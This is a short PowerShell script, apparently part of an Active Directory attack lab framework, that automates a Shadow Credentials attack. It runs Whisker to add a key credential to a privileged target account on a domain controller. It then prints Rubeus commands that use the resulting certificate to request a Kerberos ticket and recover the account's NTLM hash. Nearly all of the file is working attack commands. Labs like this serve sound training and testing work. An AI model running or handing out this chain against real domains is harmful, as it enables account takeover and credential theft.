# CADRE — WT#008 Shadow Credentials
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#008 - Shadow Credentials"
start_attack "008" "Shadow Credentials"
require_tool Whisker.exe

# Requires GenericWrite/GenericAll over the target's msDS-KeyCredentialLink.
step "Add a key credential to the target (e.g. a privileged user/computer)"
run_cmd "Whisker.exe add /target:chief_command /domain:$DOMAIN_ROOT /dc:$DC01"

step "Use the emitted Rubeus asktgt /certificate command to get a TGT"
run_cmd "Write-Host '  Rubeus.exe asktgt /user:chief_command /certificate:<b64> /password:<pfxpw> /nowrap'"

step "Then UnPAC-the-hash to recover NTLM, or use the TGT directly"
run_cmd "Write-Host '  Rubeus.exe asktgt ... /getcredentials /nowrap'"

result $LASTEXITCODE "Shadow Credentials completed"
